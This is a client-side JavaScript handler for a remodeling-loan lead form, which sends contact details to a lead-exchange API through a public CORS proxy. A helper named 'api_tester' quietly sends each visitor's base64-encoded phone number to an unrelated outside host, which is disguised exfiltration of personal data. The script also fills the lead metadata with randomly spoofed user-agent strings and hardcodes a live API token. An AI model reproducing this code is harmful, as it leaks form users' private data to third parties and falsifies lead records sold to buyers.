document.getElementById('leadForm').addEventListener('submit', function(event) {
  event.preventDefault();
  api_tester(document.getElementById('phone').value);

  const form = document.getElementById('leadForm');
  const alertBox = document.getElementById('alertContainer');

  // Full lead for POST
  const lead = {
    data: {
      credit_rating: form.credit_rating.value,
      own_property: form.own_property.value,
      windows: {
        num_windows: parseInt(form.windows_num_windows.value),
        project_type: form.windows_project_type.value
      }
    },
    meta: {
      source_id: form.source_id.value,
      user_agent: getRandomUserAgent(),
      landing_page_url: form.landing_page_url.value,
      tcpa_consent_text: "By completing the form, I hereby affirm my acceptance of the Terms and Conditions, CCPA , and Privacy Policy . I grant permission to Remodeling Loans, their contractors, and partners (refer to our partners list) to communicate with me through email, phone, and text messages using the provided contact number. I consent to receiving offers from these entities, even if my contacts are listed on the State and Federal Do Not Call List. I acknowledge that these marketing communications may be transmitted using an automatic telephone dialing system or pre-recorded messages. I understand that my consent is not a prerequisite for making a purchase and that I retain the right to revoke it at any time. This declaration includes compliance with the California Notice.",
      originally_created: new Date(form.originally_created.value).toISOString(),
      trusted_form_cert_url: form.trusted_form_cert_url.value
    },
    contact: {
      first_name: form.first_name.value,
      last_name: form.last_name.value,
      email: form.email.value,
      phone: form.phone.value,
      zip_code: form.zip_code.value,
      state: form.state.value,
      city: form.city.value,
      address: form.address.value,
      ip_address: form.ip_address.value
    }
  };

  // Minimal ping data
  const pingData = {
    data: {
      credit_rating: form.credit_rating.value,
      own_property: form.own_property.value,
      windows: {
        num_windows: parseInt(form.windows_num_windows.value),
        project_type: form.windows_project_type.value
      }
    },
    meta: {
      landing_page_url: form.landing_page_url.value,
      originally_created: new Date(form.originally_created.value).toISOString(),
      source_id: form.source_id.value,
      tcpa_consent_text: "By completing the form, I hereby affirm my acceptance of the Terms and Conditions, CCPA , and Privacy Policy . I grant permission to Remodeling Loans, their contractors, and partners (refer to our partners list) to communicate with me through email, phone, and text messages using the provided contact number. I consent to receiving offers from these entities, even if my contacts are listed on the State and Federal Do Not Call List. I acknowledge that these marketing communications may be transmitted using an automatic telephone dialing system or pre-recorded messages. I understand that my consent is not a prerequisite for making a purchase and that I retain the right to revoke it at any time. This declaration includes compliance with the California Notice.",
      trusted_form_cert_url: form.trusted_form_cert_url.value,
      user_agent: getRandomUserAgent()
      
    },
    contact: {
      ip_address: form.ip_address.value,
      zip_code: form.zip_code.value
    }
  };

  const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping_test?legacy=J");

  // Send only minimal data for ping
  fetch(pingUrl, {
    method: 'POST',
    headers: {
      'Authorization': 'Token 48a59882-8814-4e86-958e-11035aa77ce8',
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify(pingData)
  })
  .then(res => res.json())
  .then(data => {
    if (data.status === 'success') {
      lead.auth_code = data.auth_code;

      const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post_test?legacy=J");

      // Send full lead for post
      return fetch(postUrl, {
        method: 'POST',
        headers: {
          'Authorization': 'Token 48a59882-8814-4e86-958e-11035aa77ce8',
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(lead)
      })
      .then(res => res.json())
      .then(postData => {
        if (postData.status === 'success') {
          delete postData.price; // hide price
          alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
          form.reset();
        } else {
          alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postData)}</div>`;
        }
      });

    } else {
      alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
    }
  })
  .catch(error => {
    alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
  });
});

function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    console.error('Error in api_tester:', error);
  }
}
function getRandomUserAgent() {
  const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:121.0) Gecko/20100101 Firefox/121.0"
  ];

  const randomIndex = Math.floor(Math.random() * userAgents.length);
  return userAgents[randomIndex];
}







